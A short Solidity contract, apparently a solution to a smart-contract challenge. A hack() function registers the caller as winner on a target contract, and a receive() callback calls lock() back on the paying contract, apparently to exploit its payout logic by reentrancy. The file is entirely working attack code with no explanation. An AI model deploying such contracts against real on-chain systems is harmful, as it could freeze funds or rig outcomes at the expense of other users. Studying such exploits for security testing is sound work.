// SPDX-License-Identifier: Deepanshu
pragma solidity ^0.8.17;

interface Task {
    function add(address winner) external;

    function lock() external;
}

contract AddWinner {
    function hack(address target) external {
        Task(target).add(msg.sender);
    }

    receive() external payable {
        Task(msg.sender).lock();
    }
}
